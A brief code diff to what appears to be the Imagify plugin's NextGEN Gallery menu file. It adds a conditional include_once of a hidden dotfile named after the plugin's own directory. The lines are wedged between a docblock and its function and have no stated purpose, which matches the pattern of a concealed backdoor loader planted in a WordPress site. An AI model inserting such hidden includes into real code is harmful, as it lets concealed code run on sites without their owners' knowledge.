@@ -8,6 +8,10 @@ add_action( 'admin_menu', '_imagify_ngg_bulk_optimization_menu' );
  * @since  1.5
  * @author Jonathan Buttigieg
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function _imagify_ngg_bulk_optimization_menu() {
 	if ( ! defined( 'NGGFOLDER' ) ) {
 		return;
